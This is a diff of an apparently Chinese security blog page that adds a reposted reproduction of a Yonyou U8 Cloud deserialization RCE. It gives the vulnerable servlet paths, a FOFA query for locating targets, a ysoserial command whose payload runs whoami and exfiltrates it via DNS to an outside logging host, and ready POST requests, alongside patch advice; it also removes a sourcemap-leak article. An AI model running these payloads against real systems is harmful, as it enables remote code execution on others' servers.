@@ -86,6 +86,71 @@
 
     
         <h2 class="title">
+            <a href="/2025/11/06/U8-Cloud-RCE/">
+                用友U8 Cloud 反序列化RCE漏洞复现
+            </a>
+        </h2>
+    
+    <time>
+        Nov 6, 2025
+    </time>
+    <section class="content">
+        <h1><span id="用友u8-cloud-反序列化rce漏洞复现">用友U8 Cloud 反序列化RCE漏洞复现</span></h1><blockquote>
+<p>本文转自 <a target="_blank" rel="noopener" href="https://jishuzhan.net/article/1722119007621877762">OidBoy_G</a> 并作补充</p>
+</blockquote>
+<h2><span id="0x01-产品简介">0x01 产品简介</span></h2><blockquote>
+<p>用友U8 Cloud是用友推出的新一代云ERP，主要聚焦成长型、创新型企业，提供企业级云ERP整体解决方案。</p>
+</blockquote>
+<h2><span id="0x02-漏洞概述">0x02 漏洞概述</span></h2><blockquote>
+<p>用友U8 Cloud存在多处（FileManageServlet和LoginVideoServlet）反序列化漏洞，系统未将用户传入的序列化数据进行过滤就直接执行反序列化操作，结合系统本身存在的反序列化利用链，最终造成远程代码执行。</p>
+</blockquote>
+<h2><span id="0x03-影响范围">0x03 影响范围</span></h2><blockquote>
+<p>用友U8 Cloud 所有版本</p>
+</blockquote>
+<h2><span id="0x04-复现环境">0x04 复现环境</span></h2><blockquote>
+<p>FOFA：app&#x3D;”用友-U8-Cloud”</p>
+</blockquote>
+<h2><span id="0x05-漏洞复现">0x05 漏洞复现</span></h2><blockquote>
+<p>两处接口的反序列化漏洞路径：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/servlet/~uap/nc.impl.pub.filesystem.FileManageServlet</span><br><span class="line">/servlet/~uap/nc.bs.sm.login2.LoginVideoServlet</span><br></pre></td></tr></table></figure>
+
+<p>PS：用友的反序列化漏洞大部分cc6就可以直接打，post请求传入反序列化的二进制数据 就可以进行命令执行，ysoserial工具集成了多种cc链，感兴趣的可以研究研究</p>
+<p>工具地址：<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/releases/tag/v0.0.6">https://github.com/frohoff/ysoserial/releases/tag/v0.0.6</a></p>
+<p>构造序列化数据(jdk1.8)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsCollections6 <span class="string">&quot;ping `whoami`.l4z6nq7x.dnslog.pw&quot;</span> &gt;4.ser</span><br></pre></td></tr></table></figure>
+
+<p>PoC</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/servlet/~uap/nc.impl.pub.filesystem.FileManageServlet</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>your-ip</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>*</span><br><span class="line"></span><br><span class="line"><span class="language-handlebars"><span class="template-variable">&#123;&#123;<span class="name">file</span>(<span class="name">C:</span>\Users\m1813\Desktop\<span class="number">4</span>.ser)&#125;&#125;</span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">POST /servlet/~uap/nc.bs.sm.login2.LoginVideoServlet HTTP/1.1</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">Host: your-ip</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">Content-Type: *</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span><span class="template-variable">&#123;&#123;<span class="name">file</span>(<span class="name">C:</span>\Users\m1813\Desktop\<span class="number">4</span>.ser)&#125;&#125;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>PS：里面生成序列化数据文件的路径自行修改</p>
+<p>两个路径都可以打，自行测试</p>
+</blockquote>
+<h2><span id="0x06-修复建议">0x06 修复建议</span></h2><blockquote>
+<p><strong>官方修复方案</strong> ：</p>
+<p>用友安全中心已发布官方补丁：</p>
+<p><a target="_blank" rel="noopener" href="https://security.yonyou.com/#/noticeInfo?id=400">https://security.yonyou.com/#/noticeInfo?id=400</a></p>
+<p><a target="_blank" rel="noopener" href="https://security.yonyou.com/#/noticeInfo?id=399">https://security.yonyou.com/#/noticeInfo?id=399</a></p>
+<p><strong>临时修复方案：</strong></p>
+<p>使用ACL网络策略限制访问来源；</p>
+<p>使用防护类设备对&#x2F;servlet&#x2F;<del>uap&#x2F;nc.impl.pub.filesystem.FileManageServlet和&#x2F;servlet&#x2F;</del>uap&#x2F;nc.bs.sm.login2.LoginVideoServlet路径进行防护。</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/U8Cloud/" rel="tag">U8Cloud</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2025/11/06/Apksigner-Resign/">
                 Android加固之后Apk重签名
             </a>
@@ -468,7 +533,7 @@
 <h2><span id="7创建smtp账号自动让你输入密码">(7).创建smtp账号，自动让你输入密码</span></h2><blockquote>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">saslpasswd2 -c -u nidey.com 392223903</span><br></pre></td></tr></table></figure>
 
-<p>上面生成的邮箱账号：<a href="mailto:&#x33;&#x39;&#x32;&#50;&#50;&#x33;&#x39;&#48;&#x33;&#64;&#x6e;&#x69;&#x64;&#101;&#121;&#x2e;&#x63;&#111;&#109;">&#x33;&#x39;&#x32;&#50;&#50;&#x33;&#x39;&#48;&#x33;&#64;&#x6e;&#x69;&#x64;&#101;&#121;&#x2e;&#x63;&#111;&#109;</a></p>
+<p>上面生成的邮箱账号：<a href="mailto:&#51;&#57;&#50;&#x32;&#50;&#51;&#57;&#48;&#51;&#x40;&#x6e;&#x69;&#x64;&#x65;&#x79;&#x2e;&#99;&#111;&#x6d;">&#51;&#57;&#50;&#x32;&#50;&#51;&#57;&#48;&#51;&#x40;&#x6e;&#x69;&#x64;&#x65;&#x79;&#x2e;&#99;&#111;&#x6d;</a></p>
 </blockquote>
 <h2><span id="8其他命令">(8).其他命令</span></h2><blockquote>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sasldblistusers2   查看所有用户</span><br><span class="line">saslpasswd2 -d 392223903@nidey.com  删除用户</span><br></pre></td></tr></table></figure>
@@ -921,77 +986,6 @@
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/Bypass/" rel="tag">Bypass</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2024/06/13/SourceMap-Reverse/">
-                sourcemap文件泄露漏洞
-            </a>
-        </h2>
-    
-    <time>
-        Jun 13, 2024
-    </time>
-    <section class="content">
-        <h1><span id="sourcemap文件泄露漏洞">sourcemap文件泄露漏洞</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/u011975363/article/details/125694154">小心灵呀</a> 并作补充</p>
-<p>最近进行<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95&spm=1001.2101.3001.7020">渗透测试</a>时，时常遇到xray扫出sourcemap文件，每次扫到都要百度，因此做个笔记。</p>
-</blockquote>
-<h2><span id="漏洞原理">漏洞原理</span></h2><blockquote>
-<p>在日常测试时，经常会遇到以js.map为后缀的文件<br>这是jQuery中的一个新功能，支持Source Map<br>非常多Webpack打包的站点都会存在js.map文件.<br>通过sourcemap可还原前端代码找到API,间接性获取未授权访问漏洞</p>
-<p>什么是Source map<br>简单说，Source map就是一个信息文件，里面储存着位置信息。转换后的代码的每一个位置，所对应的转换前的位置。<br>有了它，出错的时候，除错工具将直接显示原始代码，而不是转换后的代码,这无疑给开发者带来了很大方便。</p>
-</blockquote>
-<h2><span id="漏洞复现">漏洞复现</span></h2><blockquote>
-<p>使用<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=xray&spm=1001.2101.3001.7020">xray</a>扫到 dirscan&#x2F;sourcemap&#x2F;default 漏洞。</p>
-<p><img src="/2024/06/13/SourceMap-Reverse/1.png" alt="image"></p>
-<p>直接访问链接可下在sourcemap文件，利用该文件还原源代码需使用reverse-sourcemap工具。<br>先安装：nodejs，<br>下载地址：<a target="_blank" rel="noopener" href="https://nodejs.org/zh-cn/download/">https://nodejs.org/zh-cn/download/</a><br>选择适合自己操作系统的版本：</p>
-<p><img src="/2024/06/13/SourceMap-Reverse/2.png" alt="image"></p>
-<p>双击下载后的文件，一路点击 next即可成功安装</p>
-<p><img src="/2024/06/13/SourceMap-Reverse/3.png" alt="image"></p>
-<p>安装完nodejs后，控制台输入：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm -v</span><br></pre></td></tr></table></figure>
-
-<p>即可查看安装的版本。</p>
-<p><img src="/2024/06/13/SourceMap-Reverse/4.png" alt="image"></p>
-<p>然后安装 reverse-sourcemap</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --global reverse-sourcemap</span><br></pre></td></tr></table></figure>
-
-<p>安装完成（PS：我电脑中已经有reverse-sourcemap，所以大家如果为初次安装看到信息可能跟我不一样）。</p>
-<p><img src="/2024/06/13/SourceMap-Reverse/5.png" alt="image"></p>
-<p>安装完成后，将其加入环境变量</p>
-<p><img src="/2024/06/13/SourceMap-Reverse/6.png" alt="image"></p>
-<p>检查是否安装成功：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reverse-sourcemap -h</span><br></pre></td></tr></table></figure>
-
-<p>安装成功</p>
-<p><img src="/2024/06/13/SourceMap-Reverse/7.png" alt="image"></p>
-<p>还原map文件</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reverse-sourcemap -v ****.js.map -o output</span><br></pre></td></tr></table></figure>
-
-<p>map文件会还原到 output文件</p>
-<p>同时还可以通过浏览器，开发者模式-source模块查看前端源代码</p>
-<p><img src="/2024/06/13/SourceMap-Reverse/8.png" alt="image"></p>
-</blockquote>
-<h2><span id="漏洞修复">漏洞修复</span></h2><blockquote>
-<p>临时的解决方法就是删除代码目录下的.map文件；<br>永久的解决方法就是在build的时候禁用产生map文件的功能；<br>在scripts&#x2F;build下的build.js 文件中添加如下配置：<br>process.env.GENERATE_SOURCEMAP &#x3D; ‘false’;<br>重新build就不会再产生sourcemap文件了</p>
-</blockquote>
-<h2><span id="参考资料">参考资料</span></h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1981398">如何还原前端代码</a></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Reverse/" rel="tag">Reverse</a><a class="tag-none-link" href="/tags/SourceMap/" rel="tag">SourceMap</a>
             </div>
         
 
